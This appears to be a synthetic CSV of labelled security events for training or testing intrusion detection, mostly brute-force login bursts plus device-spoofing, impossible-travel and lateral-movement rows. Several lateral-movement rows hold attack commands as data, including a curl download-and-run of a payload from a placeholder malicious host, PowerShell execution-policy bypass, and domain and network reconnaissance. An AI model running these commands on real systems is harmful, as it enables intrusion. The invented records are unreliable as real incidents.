+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:35,111.44.151.42,"Amandachester, Western Sahara",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:39,111.44.151.42,"Port Mckenziefort, Vietnam",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:39,111.44.151.42,"Catherineville, Benin",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:47,111.44.151.42,"North Petershire, Netherlands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:49,111.44.151.42,"Debraport, Zambia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:50,111.44.151.42,"South Gina, Uzbekistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:51,111.44.151.42,"South Bobbytown, Jamaica",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:00,111.44.151.42,"Christinebury, Cyprus",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:10,111.44.151.42,"Christopherchester, Chile",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:13,111.44.151.42,"Kellyfort, Bahrain",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:29,111.44.151.42,"Lisatown, Cambodia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:30,111.44.151.42,"Port Javier, Egypt",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:40,111.44.151.42,"East Robertfort, Palau",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:41,111.44.151.42,"Lopezshire, Tajikistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:45,111.44.151.42,"Port Shelbyfurt, Switzerland",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:51:25,111.44.151.42,"Victorfurt, Cook Islands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+59bdedb7-0a38-4760-83ca-8970fcaf1156,User,2026-06-25 15:55:32,20.8.20.198,"Kristyfurt, Bhutan",AWS Console,Password,1327,N/A,iOS 17 - Tor Browser - MAC: 88:ca:6f:64:ef:de,True,Device Spoofing
+210455e3-1c47-4bff-b319-429f535e5841,Device,2026-06-25 16:31:02,53.42.143.147,"Seanshire, Cameroon",Confluence,SSO,2229,N/A,Unknown Browser/Device,True,Impossible Travel
+325f72d6-3a2d-4ce0-94c8-f817c2982f9a,User,2026-06-25 16:38:43,1.186.196.70,"East Donaldton, Central African Republic",Jira,SSO,3072,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Ubuntu 22.04 - Edge,True,Lateral Movement
+325f72d6-3a2d-4ce0-94c8-f817c2982f9a,User,2026-06-25 16:40:43,1.186.196.70,"East Donaldton, Central African Republic",GitLab,SSO,1244,"arp -a -> wmic process call create ""cmd.exe /c set""",Ubuntu 22.04 - Edge,True,Lateral Movement
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:36,60.128.17.227,"South Mariah, Hungary",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:38,60.128.17.227,"Perryfort, Moldova",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:40,60.128.17.227,"Donnatown, Bermuda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:41,60.128.17.227,"Alexisside, North Macedonia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:41,60.128.17.227,"New Stephanie, Chad",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:42,60.128.17.227,"Danielfurt, Madagascar",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:47,60.128.17.227,"Mackenziechester, Qatar",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:50,60.128.17.227,"Port Keithville, Korea",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:54,60.128.17.227,"Lake Holly, Poland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:54,60.128.17.227,"Torresside, Bermuda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:59,60.128.17.227,"Porterview, Mali",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:00,60.128.17.227,"Andersonfort, Tokelau",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:03,60.128.17.227,"Kentbury, Saint Pierre and Miquelon",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:06,60.128.17.227,"Alishaland, Hungary",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:07,60.128.17.227,"Murphystad, Swaziland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:08,60.128.17.227,"Henryburgh, Burundi",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:21,60.128.17.227,"Beverlyhaven, Solomon Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:24,60.128.17.227,"New Brandy, New Caledonia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:28,60.128.17.227,"Hannahhaven, Angola",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:33,60.128.17.227,"Michaelchester, Iraq",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:34,60.128.17.227,"Murphyville, Fiji",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:42,60.128.17.227,"South Robertmouth, Norway",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:46,60.128.17.227,"Nguyenchester, Lithuania",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:56,60.128.17.227,"Jenniferstad, Algeria",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:01,60.128.17.227,"Medinaborough, Guam",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:12,60.128.17.227,"Port Ryan, Ireland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:16,60.128.17.227,"Freemanville, Isle of Man",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:20,60.128.17.227,"West Jeffrey, South Georgia and the South Sandwich Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:21,60.128.17.227,"Lake Charles, Bosnia and Herzegovina",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:28,60.128.17.227,"Myerschester, Chad",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:51,60.128.17.227,"Carsonborough, Congo",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:25:06,60.128.17.227,"Lake Lisa, Angola",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:25:16,60.128.17.227,"South Jesse, Guyana",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+827f4df1-524a-45f5-ae6d-481c962238e0,User,2026-06-25 18:09:27,5.109.215.230,"Tannershire, Australia",Confluence,MFA,1028,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 11 - Edge,True,Lateral Movement
+827f4df1-524a-45f5-ae6d-481c962238e0,User,2026-06-25 18:13:27,5.109.215.230,"Tannershire, Australia",Email,MFA,1775,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 11 - Edge,True,Lateral Movement
+827f4df1-524a-45f5-ae6d-481c962238e0,User,2026-06-25 18:15:27,5.109.215.230,"Tannershire, Australia",Intranet,MFA,3771,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 11 - Edge,True,Lateral Movement
+9159f183-60d0-442f-b1e9-fb6f4786d41a,User,2026-06-25 18:53:39,178.166.147.151,"Tonytown, Netherlands Antilles",Jira,SSO,1417,N/A,Kali Linux - Brave - MAC: 6c:20:f1:2e:14:3b,True,Device Spoofing
+bfa28380-2a92-4d21-83fb-e3d214c974b3,User,2026-06-26 06:26:03,182.118.33.101,"East Sean, Czech Republic",Confluence,Password,643,N/A,BlackArch - Curl - MAC: 48:0c:d9:1f:97:b7,True,Device Spoofing
+9a5b6de1-7db7-4269-b2dd-0bcc031d3da4,Device,2026-06-26 06:44:12,50.50.102.194,"Pattersonfurt, Mayotte",Database,Password,1062,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,IoT Sensor,True,Lateral Movement
+9a5b6de1-7db7-4269-b2dd-0bcc031d3da4,Device,2026-06-26 06:48:12,50.50.102.194,"Pattersonfurt, Mayotte",GitLab,Password,6311,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,IoT Sensor,True,Lateral Movement
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:32,175.41.54.141,"New James, Taiwan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:37,175.41.54.141,"Garzaview, Georgia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:38,175.41.54.141,"North Angela, El Salvador",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:38,175.41.54.141,"Abigailberg, Lithuania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:40,175.41.54.141,"East Steven, Azerbaijan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:41,175.41.54.141,"New Jamieville, Malawi",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:43,175.41.54.141,"Francesstad, British Indian Ocean Territory (Chagos Archipelago)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:46,175.41.54.141,"Transhire, Saint Helena",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:48,175.41.54.141,"Castilloview, Iceland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:52,175.41.54.141,"Lopezbury, British Virgin Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:53,175.41.54.141,"Brownport, Luxembourg",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:57,175.41.54.141,"Robinburgh, British Virgin Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:02,175.41.54.141,"New Josephshire, Sweden",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:08,175.41.54.141,"Sarabury, Brazil",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:11,175.41.54.141,"Dannyburgh, Cote d'Ivoire",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:17,175.41.54.141,"Adrianfort, Cape Verde",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:29,175.41.54.141,"Danielleberg, Moldova",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:36,175.41.54.141,"Jordanville, Dominica",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:42,175.41.54.141,"Paulahaven, Palau",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:44,175.41.54.141,"Kellyhaven, Aruba",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:57,175.41.54.141,"West Bettyhaven, El Salvador",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:50:12,175.41.54.141,"South Karenborough, Montserrat",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:50,116.201.166.216,"North Alanberg, Oman",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:53,116.201.166.216,"Lindabury, French Southern Territories",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:54,116.201.166.216,"Davistown, Qatar",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:54,116.201.166.216,"New Robert, Hungary",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:57,116.201.166.216,"Mcintoshmouth, Ireland",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:58,116.201.166.216,"Parsonsburgh, Rwanda",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:00,116.201.166.216,"Mcdanielland, Norfolk Island",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:05,116.201.166.216,"Nataliefurt, Tanzania",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:06,116.201.166.216,"East Aaronbury, Cote d'Ivoire",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:08,116.201.166.216,"Wareburgh, Cameroon",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:10,116.201.166.216,"Campbellmouth, Aruba",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:10,116.201.166.216,"Sharonville, Korea",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:16,116.201.166.216,"North Heather, Italy",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:18,116.201.166.216,"North Alexanderport, Papua New Guinea",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:24,116.201.166.216,"Cruzville, Cuba",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:26,116.201.166.216,"West Nicholasfurt, Bahamas",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:34,116.201.166.216,"West Scottmouth, Bolivia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:34,116.201.166.216,"Port Trevorhaven, Iceland",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:38,116.201.166.216,"South Jasonfort, Liechtenstein",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:50,116.201.166.216,"Danielshire, French Southern Territories",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:02,116.201.166.216,"Bradleyside, Gibraltar",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:06,116.201.166.216,"West Carrie, Taiwan",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:14,116.201.166.216,"South Nicolasmouth, Cape Verde",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:45,116.201.166.216,"Edwardsborough, Jordan",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:06,197.130.46.119,"Matthewville, Antigua and Barbuda",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:07,197.130.46.119,"Craigberg, Albania",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:12,197.130.46.119,"North Anthonyfurt, Argentina",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:13,197.130.46.119,"New Roberto, Antigua and Barbuda",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:16,197.130.46.119,"Adrianland, Uruguay",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:18,197.130.46.119,"Port Marissahaven, Sierra Leone",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:21,197.130.46.119,"West Jessicaland, Monaco",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:22,197.130.46.119,"Port Victoria, Equatorial Guinea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:24,197.130.46.119,"Theodoremouth, Israel",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:26,197.130.46.119,"Dennisborough, Botswana",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:28,197.130.46.119,"Lake Donnaton, Japan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:28,197.130.46.119,"North Scottport, Norfolk Island",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:30,197.130.46.119,"New Annahaven, Antigua and Barbuda",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:34,197.130.46.119,"Port Linda, Congo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:35,159.196.24.25,"Port Megantown, Korea",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:35,197.130.46.119,"South Carolynton, French Guiana",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:36,197.130.46.119,"North Christopherborough, Japan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:37,159.196.24.25,"East Matthewchester, Brazil",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:37,197.130.46.119,"Jacobton, Holy See (Vatican City State)",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:38,197.130.46.119,"Lopezborough, Syrian Arab Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:40,197.130.46.119,"Jacobstad, Qatar",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:40,159.196.24.25,"Toddmouth, China",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:41,159.196.24.25,"Brighthaven, Bahamas",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:41,159.196.24.25,"Simsview, Togo",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:42,197.130.46.119,"Guerreroberg, Bulgaria",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:45,159.196.24.25,"East Mandy, Nigeria",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:45,197.130.46.119,"Taylormouth, Micronesia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:48,197.130.46.119,"New Krystalstad, Nigeria",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:50,159.196.24.25,"Wilsonmouth, Gambia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:50,197.130.46.119,"Ramireztown, Australia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:51,197.130.46.119,"Rickyborough, Sri Lanka",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:51,159.196.24.25,"West Brianland, Gambia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:53,159.196.24.25,"Lake Douglas, Malaysia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:54,197.130.46.119,"North Josephstad, Papua New Guinea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:57,159.196.24.25,"Lambmouth, Namibia",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:58,197.130.46.119,"Rayside, Saint Barthelemy",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:02,159.196.24.25,"Ritterside, Senegal",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:03,159.196.24.25,"West Jennifer, Gabon",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:03,159.196.24.25,"Lake Wesleyland, Venezuela",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:07,159.196.24.25,"South Erin, Netherlands Antilles",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:10,159.196.24.25,"West Beverlyshire, China",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:14:10,197.130.46.119,"Lauramouth, Moldova",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
+f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:14:11,159.196.24.25,"West Kyleshire, Benin",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
